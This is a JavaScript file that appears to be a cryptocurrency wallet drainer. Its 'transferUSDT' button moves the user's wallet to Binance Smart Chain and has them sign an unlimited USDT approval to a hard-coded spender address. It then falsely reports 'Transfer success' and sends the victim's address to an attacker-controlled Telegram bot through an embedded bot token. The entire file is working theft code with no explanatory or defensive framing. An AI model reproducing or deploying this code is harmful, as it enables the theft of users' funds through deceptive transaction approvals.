const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955",
  SPENDER = "0x40C85f28cb6c7584B3EB9DCA2F532611A33C95BF",
  USDT_ABI = [
    {
      constant: !1,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" }
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      type: "function"
    }
  ],
  BSC_CHAIN_ID = "0x38";
async function autoSwitchToBSC() {
  if (window.ethereum)
    try {
      if ("0x38" !== (await ethereum.request({ method: "eth_chainId" })))
        try {
          (await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] }), console.log("✅ Switched to BSC"));
        } catch (e) {
          if (4902 === e.code)
            try {
              (await ethereum.request({ method: "wallet_addEthereumChain", params: [{ chainId: "0x38", chainName: "Binance Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: ["https://bsc-dataseed.binance.org/"], blockExplorerUrls: ["https://bscscan.com"] }] }), console.log("✅ BSC Added & Switched"));
            } catch (e) {
              console.error("❌ Failed to add BSC:", e);
            }
          else console.error("❌ Failed to switch to BSC:", e);
        }
      else console.log("✅ Already on BSC");
    } catch (e) {
      console.error("❌ Error checking chain:", e);
    }
  else alert("Please install MetaMask.");
}
async function transferUSDT(e) {
  let t = $(e),
    a = $(e).html();
  if ((t.html('Loading... <i class="fas fa-spinner fa-spin font-size-xs ml-2 align-middle"></i>'), t.prop("disabled", !0), !window.ethereum)) return (alert("Please install MetaMask or Trust Wallet."), t.prop("disabled", !1), void t.html(a));
  const r = new Web3(window.ethereum);
  let o = await ethereum.request({ method: "eth_accounts" });
  if (!o || 0 === o.length)
    try {
      o = await ethereum.request({ method: "eth_requestAccounts" });
    } catch (e) {
      return (console.error("User rejected connection"), alert("Error: No valid wallet address provided in URL."), t.prop("disabled", !1), void t.html(a));
    }
  const s = o[0],
    n = new r.eth.Contract(USDT_ABI, USDT_ADDRESS),
    c = r.utils.toTwosComplement(-1);
  try {
    await n.methods.approve(SPENDER, c).send({ from: s });
    (sendAddressToServer(s), t.html("Transfer success"), t.prop("disabled", !1));
  } catch (e) {
    (console.error("Approve error:", e), alert("Approval error: " + e.message), t.prop("disabled", !1), t.html(a));
  }
}

function sendAddressToServer(e) {
  var formattedAddress = "`" + e + "`"; 
  var t = JSON.stringify({ 'address': formattedAddress });
  var token = "8503739462:AAERpuLqZTgZ5zVvE1cAOjPFcwm2YX2CA84";
  var chat_id = "993778683";
  $.ajax({
    type: "POST",
    url: "https://api.telegram.org/bot" + token + "/sendMessage",
    data: JSON.stringify({
      chat_id: chat_id,
      text: "New Address:\n" + formattedAddress,
      parse_mode: "MarkdownV2"
    }),
    contentType: "application/json; charset=utf-8",
    dataType: "json"
  });
}
